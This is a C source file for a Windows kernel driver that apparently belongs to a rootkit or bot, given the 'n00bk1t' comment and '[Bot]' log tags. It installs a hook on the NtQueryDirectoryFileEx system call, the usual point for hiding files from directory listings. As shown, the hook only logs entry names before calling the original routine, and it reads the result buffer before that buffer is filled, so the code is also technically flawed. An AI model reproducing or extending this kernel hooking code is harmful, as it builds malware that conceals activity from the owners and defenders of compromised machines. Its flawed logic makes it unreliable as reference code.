#include <ntifs.h>

#include "querydir.h"
#include "handler.h"

//n00bk1t
//TODO: replace with my code
PVOID getDirEntryFileName(
        PVOID FileInformationBuffer,
        FILE_INFORMATION_CLASS FileInfoClass
)
{
        PVOID pvResult = NULL;
        switch (FileInfoClass)
        {
        case FileDirectoryInformation:
		DbgPrintEx(0, 0, "[Bot] dir FileDirectoryInformation\n");
                pvResult = (PVOID) & ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
        case FileFullDirectoryInformation:
		DbgPrintEx(0, 0, "[Bot] dir FileFullDirectoryInformation\n");
                pvResult = (PVOID) & ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
        case FileIdFullDirectoryInformation:
		DbgPrintEx(0, 0, "[Bot] dir FileIdFullDirectoryInformation\n");
                pvResult = (PVOID) & ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
        case FileBothDirectoryInformation:
		DbgPrintEx(0, 0, "[Bot] dir FileBothDirectoryInformation\n");
                pvResult = (PVOID) & ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
        case FileIdBothDirectoryInformation:
		DbgPrintEx(0, 0, "[Bot] dir FileIdBothDirectoryInformation\n");
                pvResult = (PVOID) & ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
        case FileNamesInformation:
		DbgPrintEx(0, 0, "[Bot] dir FileNamesInformation\n");
                pvResult = (PVOID) & ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
        }
        return pvResult;
}

NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
	HANDLE FileHandle,
	HANDLE Event,
	PIO_APC_ROUTINE ApcRoutine,
	PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	ULONG QueryFlags,  // Valid flags are in SL_QUERY_DIRECTORY_MASK
	PUNICODE_STRING FileName
) {
        PVOID str = getDirEntryFileName(FileInformation, FileInformationClass);
        if (str)
		DbgPrintEx(0, 0, "[Bot] dir hook %ws\n", (WCHAR*)str);
	
	return origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
}